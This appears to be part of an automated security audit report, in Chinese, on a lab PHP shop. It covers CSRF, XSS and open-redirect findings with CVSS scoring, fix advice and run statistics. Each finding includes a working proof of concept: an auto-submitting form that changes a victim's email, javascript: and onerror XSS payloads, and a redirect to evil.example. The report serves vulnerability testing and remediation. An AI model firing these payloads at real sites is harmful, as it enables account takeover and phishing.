  结论：account/settings.php 的 POST 分支读取 $_POST['email'] 后直接 UPDATE users SET email=?，但既没有在渲染的表单中输出 csrf_field()，也没有调用 check_csrf()。攻击者可构造跨站自动提交表单，在受害者已登录会话下把其账户邮箱改为攻击者控制的地址，进而影响找回密码等依赖邮箱的流程。
  输入：跨站自动提交表单中的 POST 参数 email（account/settings.php:4）
  传播：settings.php:3 POST 分支 -> :4 读取 $_POST['email'] 并校验格式 -> :5 db()->prepare('UPDATE users SET email=? WHERE id=?')->execute([$email,$u['id']])
  危险操作：在受害者已登录会话下执行 UPDATE users SET email=?（settings.php:5），阻止防护只依赖浏览器的 SameSite 会话 Cookie
  保护：bootstrap.php:38-40 提供 csrf_token/csrf_field/check_csrf，但 settings.php:8 表单未调用 csrf_field()，:3 请求处理未调用 check_csrf()；未看到其它防护
  前提：['受害者已登录；浏览器允许跨站表单提交（会话 Cookie 若为 SameSite=Lax，跨站 POST 通常不携带，需目标环境不依赖该属性才可利用）；攻击者需诱导受害者访问恶意页面并触发 POST']
  修复建议：在 settings.php 表单中调用 csrf_field()，并在 POST 分支首行调用 check_csrf()；同时将会话 Cookie 保持 SameSite=Lax/Strict 作为纵深防护。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：7f00e97c923049fc97126660fc336eea
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T16:30:56.393664+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 跨站攻击经网络投递 | lab30-shop/app/public/account/settings.php:3-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 只需构造一个跨站自动提交表单 | lab30-shop/app/public/account/settings.php:3-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | N | 攻击者自身无需任何账户权限，依赖受害者已有会话 | lab30-shop/app/public/account/settings.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | R | 需要受害者访问攻击者页面 | lab30-shop/app/public/account/settings.php:3-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 影响限于受害者账户档案 | lab30-shop/app/public/account/settings.php:5-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | N | 未直接读取保密数据 | lab30-shop/app/public/account/settings.php:5-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | L | 可篡改账户邮箱字段 | lab30-shop/app/public/account/settings.php:5-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 不直接破坏服务可用性 | lab30-shop/app/public/account/settings.php:5-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'csrf_email_change.html', 'language': 'html', 'script': '<!doctype html><form id=f action="http://TARGET/account/settings.php" method=POST><input name=email value="attacker@example.com"></form><script>document.getElementById(\'f\').submit()</script>', 'instructions': '让已登录受害者浏览器打开该 HTML；表单自动 POST 到 /account/settings.php，观察邮箱是否被改为 attacker@example.com。', 'normal_input': '受害者从本站表单正常提交同一邮箱', 'attack_input': '跨站页面自动提交 email=attacker@example.com', 'expected_result': '攻击页面提交成功后账户邮箱被篡改；若以后加入 check_csrf() 则返回 403 页面已过期。'}
````


### 台账 `c37719eb9601485c94b3dc0eddbb34ae`

- account/profile.php 将 $_GET['url'] 未转义拼入 href，可注入 javascript: 脚本与外部跳转（CVSS 3.1 Base 4.6 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:N，验证：unverified）
  来源 `9c4fc834268440f797dfef5119d28b2a` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/account/profile.php', 'start_line': 2, 'end_line': 3}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 10, 'end_line': 10}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 36}]
  结论：profile.php:2 直接把 $_GET['url'] 赋给 $url（未登录用户名下有 homepage 回落），profile.php:3 将它原样插入 <a href="$url">。同一行 h() 只用于 display_name，未用于 $url；h() 在 bootstrap.php:10 可用却未调用，构成属性上下文未编码。攻击者可传 url=javascript:alert(document.domain) 触发脚本，或传 url=//evil.example 把“访问个人主页”链接指向外部站点（开放重定向语义）。
  输入：GET 参数 url（profile.php:2）；缺省时来自 users.homepage
  传播：$_GET['url'] -> $url -> page() 闭包 -> echo '<a id="profile-link" href="'.$url.'">'
  危险操作：未编码写入 href 属性，javascript: 伪协议或引号闭合后注入事件属性
  保护：无：h() 只包裹 display_name，$url 未过滤、未做 scheme 白名单、未 h() 编码
  前提：['攻击者需持有可登录账号（PR:L），受害者为已登录用户并点击该链接（UI:R）']
  修复建议：对 $url 使用 h() 输出编码，并对协议做白名单（仅 http/https 或相对路径）；表单提交的 url 同样在服务端校验后再存储/回显。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：7f00e97c923049fc97126660fc336eea
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T16:31:39.927987+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 通过 HTTP 请求访问 profile.php 页面 | lab30-shop/app/public/account/profile.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 构造 url 参数即可，无需特殊条件 | lab30-shop/app/public/account/profile.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | require_user 要求已登录账号 | lab30-shop/app/public/account/profile.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b)；lab30-shop/app/src/bootstrap.php:33-36 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | R | 需受害者点击生成的链接才会执行 javascript: URL | lab30-shop/app/public/account/profile.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 脚本在站点源内执行 | lab30-shop/app/public/account/profile.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | L | 可读取当前页面会话内数据，但 HttpOnly cookie 限制直接取会话 | lab30-shop/app/src/bootstrap.php:16-16 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | L | 脚本可在受害者浏览器内发起同源操作 | lab30-shop/app/public/account/profile.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无直接破坏服务端数据依据 | lab30-shop/app/public/account/profile.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'profile_url_href_xss.md', 'language': 'text', 'script': '1) 以普通用户登录，访问 /account/profile.php?url=javascript:alert(document.domain)\n2) 打开页面，点击“访问个人主页”链接\n3) 或使用 url=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E 观察属性被闭合', 'instructions': '目标入口 /account/profile.php，需先登录取得会话；在浏览器中打开构造 URL 并点击页面内的 profile-link。', 'normal_input': 'url=https://example.org', 'attack_input': 'url=javascript:alert(document.domain)', 'expected_result': '正常输入渲染为普通外链；攻击输入点击后执行脚本或渲染注入的事件属性标签'}
````


### 台账 `5c3db49dc8ce4eeab05208bd9757d432`

- auth/continue.php 直接以 $_GET['next'] 设置 Location 头导致开放重定向（CVSS 3.1 Base 3.5 (low) · CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:N/A:N，验证：unverified）
  来源 `278e09caabc64130af0daf68f42f5f80` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/auth/continue.php', 'start_line': 2, 'end_line': 4}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 36}]
  结论：continue.php:2 调用 require_user() 后，若存在 $_GET['next']，第 3 行直接 header('Location: '.(string)$_GET['next'])，未校验目标是否为站内路径，也未比对白名单。攻击者可构造 /auth/continue.php?next=https://evil.example 让已登录用户被重定向到外部钓鱼页；同页表单默认值 /orders/index.php 说明预期仅接受站内路径但不构成服务端校验。
  输入：GET 参数 next（continue.php:3）
  传播：$_GET['next'] -> header('Location: ...')
  危险操作：未校验的重定向响应头写入
  保护：无：未使用白名单或 parse_url 校验 scheme/host
  前提：['攻击者需构造链接（无需权限即可构造），受害者需已登录并点击（UI:R）']
  修复建议：仅允许站内相对路径：解析 next，拒绝含 scheme/host 或 // 前缀的值，或改为按已知路由映射。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：7f00e97c923049fc97126660fc336eea
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T16:31:39.928924+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 通过 HTTP GET 访问 continue.php | lab30-shop/app/public/auth/continue.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 仅需构造 next 参数 | lab30-shop/app/public/auth/continue.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | require_user 要求登录状态 | lab30-shop/app/public/auth/continue.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b)；lab30-shop/app/src/bootstrap.php:33-36 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | R | 需受害者点击被伪造的 continue 链接 | lab30-shop/app/public/auth/continue.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 跳转由本站发出 | lab30-shop/app/public/auth/continue.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | L | 可用于钓鱼获取凭据，但无直接读取数据路径 | lab30-shop/app/public/auth/continue.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | N | 无直接数据篡改 | lab30-shop/app/public/auth/continue.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无直接可用性影响 | lab30-shop/app/public/auth/continue.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'continue_open_redirect.md', 'language': 'text', 'script': '访问 https://target/auth/continue.php?next=https%3A%2F%2Fevil.example%2Flogin\n观察响应为 302 且 Location: https://evil.example/login', 'instructions': '目标入口 /auth/continue.php，需已登录会话；可用 curl -i 观察响应头。', 'normal_input': 'next=/orders/index.php', 'attack_input': 'next=https://evil.example/login', 'expected_result': '正常输入 302 到站内路径；攻击输入 302 到外部域'}
````


## 覆盖与未决方向

受阻、未执行、未读取方向均不代表安全。

- blocked · SQL 注入与入库二次注入跨文件数据流：当前结果已保存，但剩余方向未结算，需要 Planner 缩小范围或重开任务
- blocked · 运营端 Cookie 角色信任与模板预览/渲染入口的鉴权与执行面：当前结果已保存，但剩余方向未结算，需要 Planner 缩小范围或重开任务
- blocked · 钱包/兑换/备份入口的鉴权、IDOR 与路径遍历：当前结果已保存，但剩余方向未结算，需要 Planner 缩小范围或重开任务
- blocked · 会员主页 url 参数伪协议注入与反序列化 gadget 链复核：当前结果已保存，但剩余方向未结算，需要 Planner 缩小范围或重开任务
- blocked · ops/xml-import.php 的 XML 解析与外部实体处理：当前结果已保存，但剩余方向未结算，需要 Planner 缩小范围或重开任务
- blocked · resources/views 首页与运费模板的输出编码与表单 CSRF：当前结果已保存，但剩余方向未结算，需要 Planner 缩小范围或重开任务

## 预算与覆盖事实

```json
{
  "execution": {
    "policy_version": "audit-runtime-3",
    "phase": "ended",
    "claim_epoch": 1,
    "state_revision": 388,
    "run_limits": {
      "responses": 1024,
      "tools": 8192,
      "seconds": 5400
    },
    "run_usage": {
      "responses": 134,
      "tools": 259,
      "seconds": 1341.373
    },
    "run_remaining": {
      "responses": 890,
      "tools": 7933,
      "seconds": 4058.627
    },
    "active_executions": [],
    "stop_reason": {
      "code": "unresolved_blockers",
      "message": "一次修复规划后阻塞原因仍未改变，停止重复规划。"
    },
    "context": {
      "peak_request_bytes": 142769,
      "summary_requests": 0,
      "summary_bytes": 0,
      "compactions": 0,
      "dropped_groups": 0,
      "limit_hits": 0,
      "history_bytes": 393216,
      "phases": {
        "planner_explore": {
          "peak_request_bytes": 110677,
          "requests": 3,
          "summary_requests": 0,
          "limit_hits": 0
        },
        "planner_decision": {
          "peak_request_bytes": 100620,
          "requests": 2,
          "summary_requests": 0,
          "limit_hits": 0
        },
        "planner_publish": {
          "peak_request_bytes": 69587,
          "requests": 3,
          "summary_requests": 0,
          "limit_hits": 0
        },
        "task_execute": {
          "peak_request_bytes": 142769,
          "requests": 6,
          "summary_requests": 0,
          "limit_hits": 0
        },
        "task_publish": {
          "peak_request_bytes": 64068,
          "requests": 2,
          "summary_requests": 0,
          "limit_hits": 0
        }
      }
    },
    "blocked_task_ids": [
      "0345612b086041fe95d6d63811c90e05",
      "766b41e814284c1db13825a035789362",
      "1869da7314ae49d6ab91163655916355",
      "55de81674e5d438592c6e48ed6c2c82c",
      "b7fc4b37486e4a2894289f0f828906ac",
      "579f8c50fbdc4d1bb12fed6e0cb62697"
    ],
    "poc": {
      "available": true,
      "reason": "ready",
      "message": "隔离 POC runner 已就绪。",
      "checked_at": "2026-10-27T16:09:59.090000+00:00",
      "mode": "auto",
      "target_profile": "lab30",
      "target": "lab30",
      "capabilities": {
        "supported_targets": [
          "lab30"
        ],
        "php": true,
        "python": true,
        "browser": true,
        "verification_contexts": true,
        "identity_preconditions": true,
        "idempotent_jobs": true,
        "idempotent_http_jobs": true,
        "idempotent_browser_jobs": true
      }
    },
    "final_summary_available": false,
    "coverage_review": {
      "version": "coverage-review-v1",
      "total": 61,
      "pending_total": 7,
      "pending_paths": [
        "lab30-shop/bin/lab",
        "lab30-shop/bin/package.py",
        "lab30-shop/compose.yaml",
        "lab30-shop/docker/apache.conf",
        "lab30-shop/docker/entrypoint.sh",
        "lab30-shop/docker/php.ini",
        "lab30-shop/fixtures/server.py"
      ],
      "read_paths": [
        "lab30-shop/app/bin/reset.php",
        "lab30-shop/app/bin/setup.php",
        "lab30-shop/app/public/account/backup.php",
        "lab30-shop/app/public/account/index.php",
        "lab30-shop/app/public/account/me.php",
        "lab30-shop/app/public/account/profile.php",
        "lab30-shop/app/public/account/redeem.php",
        "lab30-shop/app/public/account/settings.php",
        "lab30-shop/app/public/account/update.php",
        "lab30-shop/app/public/auth/continue.php",
        "lab30-shop/app/public/auth/login.php",
        "lab30-shop/app/public/auth/logout.php",
        "lab30-shop/app/public/auth/register.php",
        "lab30-shop/app/public/catalog/detail.php",
        "lab30-shop/app/public/catalog/greeting.php",
        "lab30-shop/app/public/catalog/index.php",
        "lab30-shop/app/public/content/page.php",
        "lab30-shop/app/public/health.php",
        "lab30-shop/app/public/index.php",
        "lab30-shop/app/public/ops/audit-log.php",
        "lab30-shop/app/public/ops/batch-check.php",
        "lab30-shop/app/public/ops/database.php",
        "lab30-shop/app/public/ops/formula.php",
        "lab30-shop/app/public/ops/index.php",
        "lab30-shop/app/public/ops/jobs.php",
        "lab30-shop/app/public/ops/maintenance.php",
        "lab30-shop/app/public/ops/members.php",
        "lab30-shop/app/public/ops/ping.php",
        "lab30-shop/app/public/ops/report.php",
        "lab30-shop/app/public/ops/template-preview.php",
        "lab30-shop/app/public/ops/template-render.php",
        "lab30-shop/app/public/ops/url-preview.php",
        "lab30-shop/app/public/ops/users.php",
        "lab30-shop/app/public/ops/xml-import.php",
        "lab30-shop/app/public/orders/create.php",
        "lab30-shop/app/public/orders/detail.php",
        "lab30-shop/app/public/orders/index.php",
        "lab30-shop/app/public/partner/portal.php",
        "lab30-shop/app/public/partner/token.php",
        "lab30-shop/app/public/support/download.php",
        "lab30-shop/app/public/support/index.php",
        "lab30-shop/app/public/support/messages.php",
        "lab30-shop/app/public/wallet/index.php",
        "lab30-shop/app/public/wallet/withdraw.php",
        "lab30-shop/app/resources/views/home.php",
        "lab30-shop/app/resources/views/shipping.php",
        "lab30-shop/app/src/backup.php",
        "lab30-shop/app/src/bootstrap.php",
        "lab30-shop/app/src/dispatch_job.php",
        "lab30-shop/app/src/host_check.php",
        "lab30-shop/app/src/member_lookup.php",
        "lab30-shop/app/src/setup.php"
      ],
      "reviewed_paths": [
        "lab30-shop/app/bin/reset.php",
        "lab30-shop/app/bin/setup.php",
        "lab30-shop/app/public/account/backup.php",
        "lab30-shop/app/public/account/index.php",
        "lab30-shop/app/public/account/me.php",
        "lab30-shop/app/public/account/profile.php",
        "lab30-shop/app/public/account/redeem.php",
        "lab30-shop/app/public/account/settings.php",
        "lab30-shop/app/public/account/update.php",
        "lab30-shop/app/public/assets/app.js",
        "lab30-shop/app/public/assets/products.svg",
        "lab30-shop/app/public/auth/continue.php",
        "lab30-shop/app/public/auth/login.php",
        "lab30-shop/app/public/auth/logout.php",
        "lab30-shop/app/public/auth/register.php",
        "lab30-shop/app/public/catalog/detail.php",
        "lab30-shop/app/public/catalog/greeting.php",
        "lab30-shop/app/public/catalog/index.php",
        "lab30-shop/app/public/content/page.php",
        "lab30-shop/app/public/health.php",
        "lab30-shop/app/public/index.php",
        "lab30-shop/app/public/ops/audit-log.php",
        "lab30-shop/app/public/ops/batch-check.php",
        "lab30-shop/app/public/ops/database.php",
        "lab30-shop/app/public/ops/formula.php",
        "lab30-shop/app/public/ops/index.php",
        "lab30-shop/app/public/ops/jobs.php",
        "lab30-shop/app/public/ops/maintenance.php",
        "lab30-shop/app/public/ops/members.php",
        "lab30-shop/app/public/ops/ping.php",
        "lab30-shop/app/public/ops/report.php",
        "lab30-shop/app/public/ops/template-preview.php",
        "lab30-shop/app/public/ops/template-render.php",
        "lab30-shop/app/public/ops/url-preview.php",
        "lab30-shop/app/public/ops/users.php",
        "lab30-shop/app/public/ops/xml-import.php",
        "lab30-shop/app/public/orders/create.php",
        "lab30-shop/app/public/orders/detail.php",
        "lab30-shop/app/public/orders/index.php",
        "lab30-shop/app/public/partner/portal.php",
        "lab30-shop/app/public/partner/token.php",
        "lab30-shop/app/public/support/download.php",
        "lab30-shop/app/public/support/index.php",
        "lab30-shop/app/public/support/messages.php",
        "lab30-shop/app/public/wallet/index.php",
        "lab30-shop/app/public/wallet/withdraw.php",
        "lab30-shop/app/resources/views/home.php",
        "lab30-shop/app/resources/views/shipping.php",
        "lab30-shop/app/src/backup.php",
        "lab30-shop/app/src/bootstrap.php",
        "lab30-shop/app/src/dispatch_job.php",
        "lab30-shop/app/src/host_check.php",
        "lab30-shop/app/src/member_lookup.php",
        "lab30-shop/app/src/setup.php"
      ],
      "skips": [
        {
          "path": "lab30-shop/app/public/assets/app.js",
          "action": "skip",
          "reason": "前端静态脚本，非第一方服务端入口，且其输出经服务端模板引用；本运行审计目标为服务端可控输入触发的漏洞，故跳过。"
        },
        {
          "path": "lab30-shop/app/public/assets/products.svg",
          "action": "skip",
          "reason": "静态图像资源，无可执行服务端逻辑，跳过。"
        }
      ],
      "complete": false,
      "notice": "已读只表示宿主记录过读取，不证明每行或每种风险已审计；跳过项保留理由，不是安全结论。"
    }
  },
  "coverage": {
    "files_total": 69,
    "files_read": 52,
    "files_with_findings": 23,
    "coverage_ratio": 0.7536,
    "read_paths": [
      "lab30-shop/app/bin/reset.php",
      "lab30-shop/app/bin/setup.php",
      "lab30-shop/app/public/account/backup.php",
      "lab30-shop/app/public/account/index.php",
      "lab30-shop/app/public/account/me.php",
      "lab30-shop/app/public/account/profile.php",
      "lab30-shop/app/public/account/redeem.php",
      "lab30-shop/app/public/account/settings.php",
      "lab30-shop/app/public/account/update.php",
      "lab30-shop/app/public/auth/continue.php",
      "lab30-shop/app/public/auth/login.php",
      "lab30-shop/app/public/auth/logout.php",
      "lab30-shop/app/public/auth/register.php",
      "lab30-shop/app/public/catalog/detail.php",
      "lab30-shop/app/public/catalog/greeting.php",
      "lab30-shop/app/public/catalog/index.php",
      "lab30-shop/app/public/content/page.php",
      "lab30-shop/app/public/health.php",
      "lab30-shop/app/public/index.php",
      "lab30-shop/app/public/ops/audit-log.php",
      "lab30-shop/app/public/ops/batch-check.php",
      "lab30-shop/app/public/ops/database.php",
      "lab30-shop/app/public/ops/formula.php",
      "lab30-shop/app/public/ops/index.php",
      "lab30-shop/app/public/ops/jobs.php",
      "lab30-shop/app/public/ops/maintenance.php",
      "lab30-shop/app/public/ops/members.php",
      "lab30-shop/app/public/ops/ping.php",
      "lab30-shop/app/public/ops/report.php",
      "lab30-shop/app/public/ops/template-preview.php",
      "lab30-shop/app/public/ops/template-render.php",
      "lab30-shop/app/public/ops/url-preview.php",
      "lab30-shop/app/public/ops/users.php",
      "lab30-shop/app/public/ops/xml-import.php",
      "lab30-shop/app/public/orders/create.php",
      "lab30-shop/app/public/orders/detail.php",
      "lab30-shop/app/public/orders/index.php",
      "lab30-shop/app/public/partner/portal.php",
      "lab30-shop/app/public/partner/token.php",
      "lab30-shop/app/public/support/download.php"
    ],
    "unread_hot_modules": [
      {
        "module": "lab30-shop",
        "unread": 17,
        "total": 69
      }
    ],
    "dependency_tree_total": 0,
    "dependency_tree_read": 0,
    "notice": "覆盖统计来自已持久化的 worker 读记录与冻结项目图，不是安全结论，也不能作为 finding 证据；read_paths 最多列 40 条，unread_hot_modules 最多列 12 个，最近 200 次尝试之外的读记录未计入。"
  }
}
```

### 防御与可信度评分

总分 **1.000**（按可用成分权重归一化，分母 0.2）。

| 成分 | 来源 | 权重 | 取值 | 说明 |
|---|---|---:|---:|---|
| 证据校验通过率 | 本次运行 | 0.2 | 1.000 | 46/46 条候选通过源码证据校验 |
| POC 验证通过率 | 本次运行 | 0.2 | 缺失 | 本次运行没有执行自动验证 |
| Planner 复核通过率 | 本次运行 | 0.2 | 缺失 | 没有需要核实的自动验证结论 |
| 注入抵抗率 | 基准实验 | 0.2 | 缺失 | 还没有完成的 Prompt 对比实验 |
| 证据链完整率 | 基准实验 | 0.2 | 缺失 | 还没有完成的 Prompt 对比实验 |

未计入成分：poc、review、injection、chain（缺失时不按 0 分代入）。
